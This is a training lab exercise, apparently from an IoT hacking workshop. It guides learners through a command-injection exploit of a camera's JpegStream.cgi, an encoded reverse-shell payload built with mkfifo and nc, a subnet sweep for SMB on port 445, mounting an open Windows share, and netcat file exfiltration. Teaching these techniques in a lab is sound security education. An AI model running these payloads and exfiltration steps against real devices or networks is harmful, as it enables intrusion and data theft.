# IoT Camera Hack | Exercise 02

## Summary

The previous exercise focused on the concepts of interacting with an IoT device and launching a publicly accessible exploit on a known vulnerability. This exercise expands on your previously gained knowledge and investigates lateral movement and data exfiltration.

The following are learning objectives that you will gain from completing this exercise:

* An understanding of Windows file shares
* Executing Remote Code Execution and data exfiltration
* Creating and using a pivot

## Instructions

1. Let's begin with something a little bit more complicated than the previous exercise. Open two _Terminal_ windows in the _Kali VM_ and we’ll attempt an exploitation technique that leverages a Remote Code Execution vulnerability.
2. For the reminder of this exercise, we’ll call the first _Terminal_ window, _Terminal Alpha_, and the other _Terminal Bravo_.
3. In _Terminal Alpha_, type the following command:

    ```bash
    ncat -vlp 31337
    ```

4. The previous command should show the following output: `Ncat: Listening on 0.0.0.0:31337`. If not, you may try again or investigate the _Kali VM_'s networking configuration.
5. At this point of the exercise, what you have done here is set up a simple server (_ncat_) with the sole purpose of exchanging messages between your _Kali VM_ and any clients that connect to this system.
6. Now here comes a more complicated step, remember that IP address<a href="#foot1"><sup>1</sup></a> that we asked you to write down in step 3 of exercise 01? We’re going to use this information to remotely instruct the camera to communicate to our simple _ncat_ server.
7. Switch to _Terminal Bravo_ and type the following command while remembering to replace `<Camera IP>` and `<Kali VM IP>` with the appropriate values mentioned throughout the exercises.

    ```bash
    curl -v \
    "http://<Camera IP>:80/JpegStream.cgi?\
    username=root\&password=%3bmkfifo%20/tmp/s0%3bnc\
    %20-w%205%20<Kali VM IP>%2031337</tmp/s0|/bin/sh>\
    /tmp/s0%202>/tmp/s0%3brm%20/tmp/s0%3b\&data_type=1\&attachment=1\&channel=1\
    \&secret=1\&key=HACKED"
    ```

8. If everything went smoothly, you should see in _Terminal Alpha_, `Ncat: Connection from <Camera IP` otherwise, try the previous step again.

9. If you were successful,  you can now claim that you remotely exploited an IoT camera with the ability to instruct the camera to execute additional commands that was outside its normal, designed operation.

10. For a hacker, gaining access to a network is a feat by itself, but their typical motives is lateral movement and obtaining intellectual property or data. Let’s try to look for file services on the network such as a Windows File Share that we previously created from _Exercise 00_.

11. Write down the IP Addresses of the following devices:

    Camera IP: ____________________________________

    Kali VM IP: ___________________________________

12. Compare the two IP addresses and you should notice that there are many similarities. Specifically, the first three numerical values should be similar such as _192.168.1.X_ or _192.168.0.X_ where the _X_ should be a different value. If there are no similarities, verify that the _Kali VM_ has its _Virtual Box_ network configuration is set to _Bridged Adapter_.

13. In _Terminal Alpha_, type the following command where _XXX.XXX.XXX_ is the similar numerical values we discovered in the previous step. Note, be sure to use backtick (the key above tab) for the command:

    ```bash
    for i in `seq 1 254`;
    do echo -n $i- && wget http://XXX.XXX.XXX.$i:445 -O -; 
    done
    ```

14. At this point, you are trying to find additional devices (enumerate) that reside on the same network as the camera. Particularly, we are looking for any system that utilizes file sharing services (:445), like a Windows computer as they may hold valued information for a hacker like yourself. From the output in _Terminal Alpha_, which number shows no response from server?

    Write down the number here __________________________

    Note, if you have difficulty locating the number, make sure the _Virtual Box_ network configuration for both the _Kali_ and _Windows VM_ are set to _Bridged Adapter_.

15. Type the following command while replacing AAA with the number you wrote down in step 14:

    ```bash
    mount -t cifs -o username=””,password=”” //192.168.5.AAA/share /mnt
    ```

16. Now type the following two commands in _Terminal Alpha_: 

    ```bash
    cd /mnt
    ls
    ```

17. What do you see? It should be something interesting and personal to what a home user may have on their computer. What you have just done is identified that a particular system on the network (step 14) uses a file sharing service, and attempt to connect to it (step 15) and access the contents in the share (step 16).

18. Lets take the content that you have discovered and send it back to our _Kali VM_ for examination. Open up a _netcat_ listener (another simple server) to allow us to access the file with the following command while replacing _<File Name>_ with the name of the discovered file:

    ```bash
    nc -l -p 31338 < <File Name>
    ```

19. Open a new _Terminal_ and type the following command to retrieve the file we previously created where X is your user number:
nc <Camera IP> 31338 > ~/Desktop/<File Name>

20. You should now see the file on your _Desktop_

21. You may now look around the _/mnt_ folder for anything else you find interesting, but when you’re done, type `umount /mnt`

22. Thank you for participating in our IoT Exercise, we hope you had a blast!

Footnotes
=========
<a id="foot1" href="#foot1"><sup>[1]</sup></a> The reminder of this and subsequent exercises will refer this IP address as the `<Kali VM IP>` where the angle brackets are __not__ included in the step